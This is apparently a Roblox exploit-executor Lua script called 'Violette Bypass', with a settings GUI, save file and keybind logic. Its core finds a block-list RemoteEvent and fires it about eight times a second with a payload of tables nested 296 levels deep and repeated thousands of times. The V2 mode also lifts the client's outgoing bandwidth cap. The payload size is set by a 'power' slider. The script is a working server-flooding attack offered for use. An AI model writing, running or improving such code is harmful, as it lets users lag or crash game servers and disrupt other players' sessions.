-- ══ Violette Bypass (opened from Settings > Violette Bypass button) ══
pcall(function()
_G._VioletteccBypassUI = (function()
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer
local panelOpen = false   -- window visibility (the bypass itself keeps running when hidden)
local _conns = {}
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

if PlayerGui:FindFirstChild("violetteBypass") then
    PlayerGui.violetteBypass:Destroy()
end

local MIN_POWER = 60000
local MAX_POWER = 150000
local DEFAULT_POWER = 100000
local STEP = 5000
local SAVE_FILE = "violetteBypass.json"
local MIN_GUI = 0.6
local MAX_GUI = 1.6
local DEFAULT_GUI = 0.7
local GUI_STEP = 0.1
local AUTO_MIN_WS = 10
local AUTO_MAX_WS = 25

local BG_ID = "rbxassetid://71792293290595"   -- Violette BG 1

local PALETTE = {
    Accent = Color3.fromRGB(175, 95, 255),      -- Violette purple
    AccentDim = Color3.fromRGB(88, 48, 128),
    Text = Color3.fromRGB(240, 240, 240),
    PanelLight = Color3.fromRGB(12, 12, 12),
    Track = Color3.fromRGB(30, 30, 30),
}

local State = {
    Enabled = false,
    Mode = "V1",
    BackgroundIndex = 1,
    Keybind = nil,
    Listening = false,
    StartTime = 0,
    Power = DEFAULT_POWER,
    GuiSize = DEFAULT_GUI,
    AutoEnable = false,
    Compact = false,
    AutoActive = false
}

local remote, payload, loopTask
local saveTimer = 0
local saveInterval = 10
local KeybindButton, PowerLabel, PowerInput, SliderFill, SliderKnob, SliderTrack
local setCompact, updateMiniVisual, MiniScale   -- mobile / compact mode
local ToggleKnob, ToggleTrack, ToggleFill
local BGImage
local updateAccentTheme

local Theme = {
    Background = Color3.fromRGB(0, 0, 0),
    Panel = Color3.fromRGB(0, 0, 0),
    PanelLight = PALETTE.PanelLight,
    Accent = PALETTE.Accent,
    AccentDim = PALETTE.AccentDim,
    Text = PALETTE.Text,
    SubText = Color3.fromRGB(150, 150, 150),
    Track = PALETTE.Track,
}

local function snapPower(value)
    local steps = math.floor((value - MIN_POWER) / STEP + 0.5)
    return math.clamp(MIN_POWER + steps * STEP, MIN_POWER, MAX_POWER)
end

local function snapGui(value)
    local steps = math.floor((value - MIN_GUI) / GUI_STEP + 0.5)
    return math.clamp(MIN_GUI + steps * GUI_STEP, MIN_GUI, MAX_GUI)
end

local function saveData()
    pcall(function()
        local data = {
            Mode = State.Mode,
            ModeScheme = 2,
            BackgroundIndex = State.BackgroundIndex,
            Power = State.Power,
            Keybind = State.Keybind and State.Keybind.Name or nil,
            GuiSize = State.GuiSize,
            AutoEnable = State.AutoEnable,
            Compact = State.Compact
        }
        writefile(SAVE_FILE, HttpService:JSONEncode(data))
    end)
end

local function loadData()
    if not isfile(SAVE_FILE) then return false end
    local success, data = pcall(function()
        return HttpService:JSONDecode(readfile(SAVE_FILE))
    end)
    if success and data then
        if data.ModeScheme == 2 and (data.Mode == "V1" or data.Mode == "V2") then
            State.Mode = data.Mode
        else
            State.Mode = "V1"   -- older save: the old second mode is now V1
        end
        if data.BackgroundIndex ~= nil then
            State.BackgroundIndex = math.clamp(tonumber(data.BackgroundIndex) or 1, 1, 4)
        end
        if data.Power then State.Power = snapPower(data.Power) end
        if data.Keybind then
            local key = Enum.KeyCode[data.Keybind]
            if key then State.Keybind = key end
        end
        if data.GuiSize then
            State.GuiSize = snapGui(tonumber(data.GuiSize) or DEFAULT_GUI)
        end
        if data.AutoEnable ~= nil then
            State.AutoEnable = data.AutoEnable
        end
        State.Compact = data.Compact == true
        return true
    end
    return false
end

local function corner(radius, parent)
    local c = Instance.new("UICorner")
    c.CornerRadius = UDim.new(0, radius)
    c.Parent = parent
    return c
end

local function stroke(color, thickness, transparency, parent)
    local s = Instance.new("UIStroke")
    s.Color = color
    s.Thickness = thickness
    s.Transparency = 1
    s.Parent = parent
    return s
end

local function formatK(value)
    return string.format("%.1fK", value / 1000)
end

local function findRemote()
    local storage = game:FindFirstChild("RobloxReplicatedStorage")
    if not storage then return nil end
    local names = {"SetPlayerBlockList", "UpdatePlayerBlockList", "SetBlockList", "UpdateBlockList"}
    for _, name in ipairs(names) do
        local r = storage:FindFirstChild(name)
        if r and r:IsA("RemoteEvent") then return r end
    end
    for _, child in ipairs(storage:GetChildren()) do
        if child:IsA("RemoteEvent") and child.Name:find("Block") then return child end
    end
    return nil
end

local function buildPayload()
    local main = {}
    local nested = {{}}
    local current = nested[1]
    for _ = 1, 296 do
        local new = {}
        table.insert(current, new)
        current = new
    end
    local maxRep = math.min(math.floor(State.Power / 298), 10000)
    for _ = 1, maxRep do
        table.insert(main, nested)
    end
    return main
end

-- V2: Bubble Hub bypass payload (same nesting depth, no repeat cap)
local function buildPayloadBubble()
    local main = {}
    local nested = {{}}
    local current = nested[1]
    for _ = 1, 296 do
        local new = {}
        table.insert(current, new)
        current = new
    end
    for _ = 1, math.floor(State.Power / 298) do
        table.insert(main, nested)
    end
    return main
end

local function startRemoteLoop(buildFn, delay, unlimitedKbps)
    if unlimitedKbps then
        pcall(function()
            game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
        end)
    end
    if not remote then
        remote = findRemote()
        if not remote then return end
    end
    payload = buildFn()
    if loopTask then task.cancel(loopTask) loopTask = nil end
    loopTask = task.spawn(function()
        while State.Enabled do
            if not remote then
                remote = findRemote()
                task.wait(1)
            else
                pcall(function() remote:FireServer(payload) end)
                task.wait(delay)
            end
        end
    end)
end

local function stopRemoteLoop()
    if loopTask then task.cancel(loopTask) loopTask = nil end
end

local function startBypass()
    if State.Mode == "V1" then
        startRemoteLoop(buildPayload, 0.125, false)        -- V1 (the previous V2)
    elseif State.Mode == "V2" then
        startRemoteLoop(buildPayloadBubble, 0.12, true)    -- V2 (Bubble Hub bypass)
    end
end

local function stopBypass()
    stopRemoteLoop()
end

